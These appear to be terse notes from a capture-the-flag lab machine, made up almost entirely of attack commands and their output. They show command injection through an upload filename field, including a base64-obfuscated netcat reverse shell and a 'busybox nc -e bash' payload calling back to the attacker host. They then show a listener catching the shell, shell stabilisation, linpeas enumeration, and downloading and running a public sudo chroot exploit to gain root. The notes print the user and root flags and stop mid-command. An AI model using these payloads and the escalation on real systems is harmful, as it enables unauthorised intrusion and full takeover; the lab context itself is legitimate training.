filename="video.mp4"


busybox

====================================================================================================================================================================================
filename='video.mp4";whoami;0"'



filename="video.mp4; echo bmMgMTAuMC4yNTAuNSA0NDQ0IC1lIC9iaW4vc2gK | base64 -d | sh; echo .jpg"
busybox







https://github.com/kirang89/Pyworks/blob/master/ip2num.py





====================================================================================================================================================================================



filename='video.mp4";busybox nc 167836165 4444 -e bash;0"'






┌──(kali㉿kali)-[~/Documents/echoMedia]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.0.250.5] from (UNKNOWN) [10.0.250.12] 38268
history
ls
index.php
upload





====================================================================================================================================================================================






/usr/bin/script -qc /bin/bash /dev/null


crtl + Z
    www-data@TheHackersLabs-EchoMedia:/var/www/html/upload$ ^Z
    zsh: suspended  nc -lvnp 4444


stty raw -echo;fg


    [1]  + continued  nc -lvnp 4444
                                reset

    reset: unknown terminal type unknown
    Terminal type? xterm




stty rows 30 columns 113
export TERM=xterm







====================================================================================================================================================================================


www-data@TheHackersLabs-EchoMedia:/tmp$ ls
linpeas.sh
www-data@TheHackersLabs-EchoMedia:/tmp$ ./linpeas.sh






╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                              
Sudo version 1.9.17    





====================================================================================================================================================================================


https://github.com/pr0v3rbs/CVE-2025-32463_chwoot







──(kali㉿kali)-[~/Documents/echoMedia/CVE-2025-32463_chwoot]
└─$ ls              
Dockerfile  LICENSE  README.md  run.sh  sudo-chwoot.sh
                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/echoMedia/CVE-2025-32463_chwoot]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.0.250.12 - - [22/Sep/2025 17:03:45] "GET /run.sh HTTP/1.1" 200 -
10.0.250.12 - - [22/Sep/2025 17:05:01] "GET /sudo-chwoot.sh HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
                                                                                                                                            

====================================================================================================================================================================================
www-data@TheHackersLabs-EchoMedia:/tmp$ wget http://10.0.250.5:8000/sudo-chwoot.sh
--2025-09-22 15:05:00--  http://10.0.250.5:8000/sudo-chwoot.sh
Connecting to 10.0.250.5:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1046 (1.0K) [text/x-sh]
Saving to: 'sudo-chwoot.sh'

sudo-chwoot.sh               100%[===========================================>]   1.02K  --.-KB/s    in 0s      




www-data@TheHackersLabs-EchoMedia:/tmp$ chmod +x sudo-chwoot.sh 

www-data@TheHackersLabs-EchoMedia:/tmp$ ./sudo-chwoot.sh id
woot!
uid=0(root) gid=0(root) groups=0(root),33(www-data)




www-data@TheHackersLabs-EchoMedia:/tmp$ ./sudo-chwoot.sh   
woot!




root@TheHackersLabs-EchoMedia:/# ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old
root@TheHackersLabs-EchoMedia:/# whoami 
root



====================================================================================================================================================================================





root@TheHackersLabs-EchoMedia:/# cd /home/Dr_Simi/
root@TheHackersLabs-EchoMedia:/home/Dr_Simi# ls
user.txt



root@TheHackersLabs-EchoMedia:/home/Dr_Simi# cat user.txt 
YjQwcWliRTZFMmVPUkV1c08zM3FHUzVv


====================================================================================================================================================================================


root@TheHackersLabs-EchoMedia:/home/Dr_Simi# cd /root/
root@TheHackersLabs-EchoMedia:/root# ls
root.txt

root@TheHackersLabs-EchoMedia:/root# cat root.txt 
SjI5cXhQVHowNkdia1Z2MnNQWlQyR1N5

root@TheHackersLabs-EchoMedia:/root# cat /etc/sudo
